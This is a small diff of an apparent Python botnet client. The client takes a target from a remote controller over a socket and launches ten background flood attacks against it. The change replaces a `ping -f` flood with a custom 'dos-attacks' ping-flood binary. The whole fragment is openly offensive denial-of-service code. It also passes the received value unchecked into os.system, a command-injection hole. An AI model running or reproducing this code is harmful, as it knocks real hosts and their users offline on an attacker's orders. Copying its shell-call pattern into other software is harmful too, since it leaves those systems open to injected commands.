@@ -25,4 +25,4 @@ if __name__ == '__main__':
         TARGET = s.recv(1024).decode()
         print(f"Order received, attacking {TARGET}")
         for _ in range(10):
-            os.system(f"ping -f {TARGET} &")
+            os.system(f"./dos-attacks/target/release/dos-attacks ping-flood {TARGET} &")
